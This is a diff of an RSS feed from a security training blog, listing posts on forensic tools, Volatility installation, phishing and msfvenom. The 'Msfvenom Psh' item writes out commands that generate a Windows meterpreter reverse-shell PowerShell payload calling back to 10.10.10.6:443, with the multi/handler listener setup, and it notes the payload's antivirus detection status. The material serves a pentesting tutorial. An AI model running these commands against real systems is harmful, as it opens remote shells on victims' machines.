@@ -1,19 +1,20 @@
-<?xml version="1.0" encoding="UTF-8" ?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>Tools on Classroom</title>
-    <link>http://localhost:1313/tags/tools/</link>
+    <link>https://classroom.anir0y.in/tags/tools/</link>
     <description>Recent content in Tools on Classroom</description>
-    <generator>Anir0ry : Blog v1.0</generator>
+    <generator>Hugo -- 0.155.0</generator>
     <language>en</language>
     <copyright>YOU CAN REUSE MY CONTENT</copyright>
-    <lastBuildDate>Tue, 13 Apr 2021 21:15:35 +0530</lastBuildDate><atom:link href="http://localhost:1313/tags/tools/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 13 Apr 2021 21:15:35 +0530</lastBuildDate>
+    <atom:link href="https://classroom.anir0y.in/tags/tools/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Forensic Tools</title>
+      <link>https://classroom.anir0y.in/post/ref-forensic/</link>
       <pubDate>Tue, 13 Apr 2021 21:15:35 +0530</pubDate>
-      
-      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
-      <description>&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/mesquidar/ForensicsTools/master/FORENSICS%20TOOLS.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+      <guid>https://classroom.anir0y.in/post/ref-forensic/</guid>
+      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/mesquidar/ForensicsTools/master/FORENSICS%20TOOLS.png&#34;&gt;&lt;/p&gt;
 &lt;h1 id=&#34;forensics-tools&#34;&gt;Forensics Tools&lt;/h1&gt;
 &lt;p&gt;A list of free and open source forensics analysis tools and other resources.&lt;/p&gt;
 &lt;ul&gt;
@@ -303,29 +304,23 @@ developed in .NET supports all Windows x64, includes code integrity and write su
 &lt;/ul&gt;
 &lt;h3 id=&#34;books&#34;&gt;Books&lt;/h3&gt;
 &lt;p&gt;&lt;em&gt;more at &lt;a href=&#34;http://dfir.org/?q=node/8&#34;&gt;Recommended Readings&lt;/a&gt; by Andrew Case&lt;/em&gt;&lt;/p&gt;</description>
-      <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>http://localhost:1313/post/ref-forensic/</link>
-    
     </item>
-   
-      
-    
     <item>
       <title>Msfvenom Psh</title>
+      <link>https://classroom.anir0y.in/post/msfvenom-psh/</link>
       <pubDate>Thu, 01 Apr 2021 16:14:32 +0530</pubDate>
-      
-      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
+      <guid>https://classroom.anir0y.in/post/msfvenom-psh/</guid>
       <description>&lt;h1 id=&#34;meterpreter-reverse-shell-with-powershell&#34;&gt;meterpreter reverse shell with powershell&lt;/h1&gt;
 &lt;h2 id=&#34;create-shell&#34;&gt;Create Shell&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;10.10.10.6 LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt; -f psh -o meterpreter-64.ps1
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No encoder or badchars specified, outputting raw payload
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Payload size: &lt;span style=&#34;color:#ae81ff&#34;&gt;510&lt;/span&gt; bytes
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Final size of psh file: &lt;span style=&#34;color:#ae81ff&#34;&gt;3255&lt;/span&gt; bytes
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Saved as: meterpreter-64.ps1
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10.10.10.6 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;443&lt;/span&gt; -f psh -o meterpreter-64.ps1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;No encoder or badchars specified, outputting raw payload
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload size: &lt;span class=&#34;m&#34;&gt;510&lt;/span&gt; bytes
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Final size of psh file: &lt;span class=&#34;m&#34;&gt;3255&lt;/span&gt; bytes
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Saved as: meterpreter-64.ps1
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;setup-listener&#34;&gt;Setup listener&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfconsole -x &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.6; set lport 443; set ExitOnSession false; exploit -j&amp;#34;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfconsole -x &lt;span class=&#34;s2&#34;&gt;&amp;#34;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.6; set lport 443; set ExitOnSession false; exploit -j&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;interact&#34;&gt;Interact&lt;/h2&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;...[snip]
 payload =&amp;gt; windows/x64/meterpreter/reverse_tcp
@@ -347,30 +342,24 @@ Id Name Type Information Connection
 -- ---- ---- ----------- ----------
 1 meterpreter x64/windows [redacted]
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;if-windows-defender-is-enabled&#34;&gt;if Windows Defender is enabled&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\PENTEST&amp;gt; C:\PENTEST\meterpreter-&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;.ps1
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;At C:\PENTEST\meterpreter-&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;.ps1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; char&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+ $VlSIhDyrsor = &lt;span style=&#34;color:#e6db74&#34;&gt;@&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;+ ~~~~~~~~~~~~~~~~~
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;This script contains malicious content and has been blocked by your antivirus software.
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;+ CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;+ FullyQualifiedErrorId : ScriptContainedMaliciousContent
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;PS C:\PENTEST&amp;gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PENTEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PENTEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;meterpreter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;At&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PENTEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;meterpreter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$VlSIhDyrsor&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sh&#34;&gt;@&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sh&#34;&gt;+ ~~~~~~~~~~~~~~~~~
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sh&#34;&gt;This script contains malicious content and has been blocked by your antivirus software.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sh&#34;&gt;+ CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sh&#34;&gt;+ FullyQualifiedErrorId : ScriptContainedMaliciousContent
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sh&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sh&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sh&#34;&gt;PS C:\PENTEST&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;summary&#34;&gt;Summary:&lt;/h2&gt;
 &lt;p&gt;The the generated ps1 can be saved to disk, and is not detected as a virus , and runs succesfull creating a shell, but it can’t run with defender enabled on  windows 10 box.&lt;/p&gt;</description>
-      <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>http://localhost:1313/post/msfvenom-psh/</link>
-    
     </item>
-   
-      
-    
     <item>
       <title>Msfvenom Cheatsheet</title>
+      <link>https://classroom.anir0y.in/post/msfvenom-cheatsheet/</link>
       <pubDate>Thu, 01 Apr 2021 16:11:01 +0530</pubDate>
-      
-      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
+      <guid>https://classroom.anir0y.in/post/msfvenom-cheatsheet/</guid>
       <description>&lt;hr&gt;
 &lt;h1 id=&#34;msfvenom-cheatsheet&#34;&gt;MSFVenom Cheatsheet&lt;/h1&gt;
 &lt;p&gt;Single Page Cheatsheet for common MSF Venom One Liners&lt;br&gt;
@@ -493,61 +482,46 @@ Available in PDF, DOCX and Markdown format!
 &lt;/table&gt;
 &lt;h1 id=&#34;multihandler-listener&#34;&gt;Multihandler Listener&lt;/h1&gt;
 &lt;p&gt;To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,&lt;/p&gt;</description>
-      <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>http://localhost:1313/post/msfvenom-cheatsheet/</link>
-    
     </item>
-   
-      
-    
     <item>
       <title>Phishing Attack</title>
+      <link>https://classroom.anir0y.in/post/blog2/</link>
       <pubDate>Sun, 21 Mar 2021 21:23:22 +0530</pubDate>
-      
-      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
-      <description>&lt;img src=&#34;https://i.imgur.com/F6UyCki.png&#34; width=&#34;80%&#34; height=&#34;auto&#34;&gt;
-&lt;h2 id=&#34;overview&#34;&gt;Overview:&lt;/h2&gt;
-&lt;p&gt;Even though the internet is one of the man’s great creation, but it has remained as a root cause for many cyber attacks. Let us discuss about cyber punk who is the root cause for many data breaches that has happened till date.&lt;/p&gt;
-&lt;p&gt;Phishing is a type of social engineering attack, where the attacker generally tries to impersonate as a legitimate person to get some sensitive credentials like [username, passwords, etc] of the target. It is the most common and widely used technique to gain initial access or to intrude into an internal network of an organisation. These attacks generally target financial service companies, cooperative employees, top management. Phishing technique is a root cause for many data thefts, and the reason for this lack of awareness among the employees&lt;/p&gt;</description>
-      <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>http://localhost:1313/post/blog2/</link>
-    
+      <guid>https://classroom.anir0y.in/post/blog2/</guid>
+      <description>Phishing is a type of social engineering attack, where the attacker generally tries to impersonate as a legitimate person to get some sensitive credentials like [username, passwords, etc] of the target.</description>
     </item>
-   
-      
-    
     <item>
       <title>Volatility Installation in Linux</title>
+      <link>https://classroom.anir0y.in/post/vol2-installation/</link>
       <pubDate>Wed, 17 Mar 2021 01:00:08 +0530</pubDate>
-      
-      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
+      <guid>https://classroom.anir0y.in/post/vol2-installation/</guid>
       <description>&lt;h1 id=&#34;how-to-install-volatility-26-in-kali&#34;&gt;How to Install Volatility 2.6 in Kali&lt;/h1&gt;
 &lt;p&gt;Volatility is no longer packaged with new Kali releases, but can be manually installed.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/volatility&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ vol.py   
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Volatility Foundation Volatility Framework 2.6.1
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; *** Failed to import volatility.plugins.registry.shutdown &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ImportError: No module named Crypto.Hash&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; *** Failed to import volatility.plugins.getservicesids &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ImportError: No module named Crypto.Hash&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; *** Failed to import volatility.plugins.timeliner &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ImportError: No module named Crypto.Hash&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; *** Failed to import volatility.plugins.malware.apihooks &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;NameError: name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;distorm3&amp;#39;&lt;/span&gt; is not defined&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; *** Failed to import volatility.plugins.malware.threads &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;NameError: name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;distorm3&amp;#39;&lt;/span&gt; is not defined&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; *** Failed to import volatility.plugins.mac.apihooks_kernel &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ImportError: No module named distorm3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/volatility&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ vol.py   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Volatility Foundation Volatility Framework 2.6.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; *** Failed to import volatility.plugins.registry.shutdown &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ImportError: No module named Crypto.Hash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; *** Failed to import volatility.plugins.getservicesids &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ImportError: No module named Crypto.Hash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; *** Failed to import volatility.plugins.timeliner &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ImportError: No module named Crypto.Hash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; *** Failed to import volatility.plugins.malware.apihooks &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NameError: name &lt;span class=&#34;s1&#34;&gt;&amp;#39;distorm3&amp;#39;&lt;/span&gt; is not defined&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; *** Failed to import volatility.plugins.malware.threads &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NameError: name &lt;span class=&#34;s1&#34;&gt;&amp;#39;distorm3&amp;#39;&lt;/span&gt; is not defined&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; *** Failed to import volatility.plugins.mac.apihooks_kernel &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ImportError: No module named distorm3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;as-volatility-relies-on-certain-python-2-dependencies-we-will-need-to-install-python-2-pip&#34;&gt;As Volatility relies on certain Python 2 dependencies, we will need to install Python 2 Pip:&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python2 get-pip.py
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# upgrade setup tools to avoid &amp;#34;invalid command egg_info&amp;#34; error&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;upgrade setuptools
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# install python-dev to avoid &amp;#34;x86_64-linux-gnu-gcc failed...&amp;#34; error&lt;/span&gt;
